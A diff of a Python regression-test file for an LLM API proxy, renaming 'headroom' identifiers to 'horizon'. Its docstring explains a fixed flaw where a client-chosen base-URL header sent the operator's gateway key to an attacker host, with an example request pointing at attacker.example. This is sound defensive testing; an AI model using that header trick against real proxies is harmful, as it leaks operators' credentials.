@@ -1,6 +1,6 @@
 """The operator's own secrets must never follow a client-chosen upstream.
 
-``x-headroom-base-url`` lets a client pick the upstream for a single request so
+``x-horizon-base-url`` lets a client pick the upstream for a single request so
 OpenAI-compatible gateways route through the dedicated handlers. That is a
 feature and these tests do not remove it.
 
@@ -10,13 +10,13 @@ help text uses an API key as the example. It was merged into the upstream-bound
 headers *before* the destination was resolved, so:
 
     POST /v1/messages
-    X-Headroom-Base-Url: https://attacker.example
+    X-Horizon-Base-Url: https://attacker.example
 
 reached the attacker's host carrying the operator's gateway key. One request, no
 user interaction, from anything able to reach the proxy port.
 
 The rule now is the one ``copilot_auth.is_copilot_upstream_url`` already applied
-to Headroom's own Copilot token, generalized: a secret only travels to a host the
+to Horizon's own Copilot token, generalized: a secret only travels to a host the
 operator designated. Undesignated hosts still get proxied — just without the
 secret.
 """
@@ -30,9 +30,9 @@ pytest.importorskip("fastapi")
 
 from fastapi.testclient import TestClient  # noqa: E402
 
-from headroom.proxy.helpers import merge_extra_headers  # noqa: E402
-from headroom.proxy.server import ProxyConfig, create_app  # noqa: E402
-from headroom.proxy.upstream_trust import (  # noqa: E402
+from horizon.proxy.helpers import merge_extra_headers  # noqa: E402
+from horizon.proxy.server import ProxyConfig, create_app  # noqa: E402
+from horizon.proxy.upstream_trust import (  # noqa: E402
     ALLOWED_HOSTS_ENV,
     is_trusted_upstream,
     reset_warning_state,
@@ -53,7 +53,7 @@ def _clear_warn_memo():
 @pytest.fixture(autouse=True)
 def _allow_reserved_test_upstreams(monkeypatch: pytest.MonkeyPatch) -> None:
     """Permit reserved test hosts while credential trust is tested separately."""
-    monkeypatch.setenv("HEADROOM_ALLOWED_BASE_URLS", "attacker.example,corp-gw.internal")
+    monkeypatch.setenv("HORIZON_ALLOWED_BASE_URLS", "attacker.example,corp-gw.internal")
 
 
 class _Capturing(httpx.AsyncBaseTransport):
@@ -106,7 +106,7 @@ def _app(**overrides) -> tuple[TestClient, _Capturing]:
 def _post(client: TestClient, base_url: str | None):
     headers = {"x-api-key": "client-key", "anthropic-version": "2023-06-01"}
     if base_url:
-        headers["x-headroom-base-url"] = base_url
+        headers["x-horizon-base-url"] = base_url
     return client.post(
         "/v1/messages",
         headers=headers,
